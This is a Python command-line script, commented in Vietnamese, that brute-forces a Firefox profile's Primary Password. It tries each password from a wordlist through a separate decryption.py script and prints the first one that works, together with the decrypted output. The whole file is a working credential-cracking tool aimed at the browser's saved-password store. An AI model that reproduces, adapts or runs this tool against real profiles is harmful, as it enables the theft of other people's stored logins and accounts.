import subprocess
import argparse
from tqdm import tqdm

# ======== Hàm đọc tất cả mật khẩu từ file wordlist ========
def load_wordlist(filepath):
    with open(filepath, "r", encoding="utf-8") as file:
        return file.read().splitlines()

# ======== Hàm thử giải mã với một mật khẩu cụ thể ========
def try_password(profile_path, password):
    try:
        result = subprocess.run(
            ["python", "decryption.py", "-d", profile_path, "-p", password],  # Gọi script giải mã
            capture_output=True,
            text=True,
            timeout=1
        )
        return result.stdout.strip() + result.stderr.strip()  # Trả về kết quả đầu ra
    except Exception as e:
        return f"Error: {e}"

# ======== Hàm brute-force qua từng mật khẩu trong wordlist ========
def bruteforce(profile_path, passwords):    
    for password in tqdm(passwords, desc="Brute-force", ncols=77, leave=False, bar_format="{l_bar}{bar}    |   {n_fmt}/{total_fmt} [{elapsed} - {remaining}]"):
        output = try_password(profile_path, password)
        if output and not output.startswith("Error"):
            print(f"\nSuccess! Primary Password is: {password}")
            print(output)
            return
    print("Fail! No valid password found.")

# ======== Main ========
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Brute-force Firefox Primary Password using decryption.py")
    parser.add_argument("-d", "--profile", required=True, help="Path to Firefox profile directory")
    parser.add_argument("-f", "--fuzzing", required=True, help="Path to wordlist file")
    args = parser.parse_args()

    try:
        passwords = load_wordlist(args.fuzzing)  # Đọc danh sách mật khẩu từ file wordlist
        bruteforce(args.profile, passwords)      # Bắt đầu brute-force
    except KeyboardInterrupt:
        print("Brute-force interrupted.")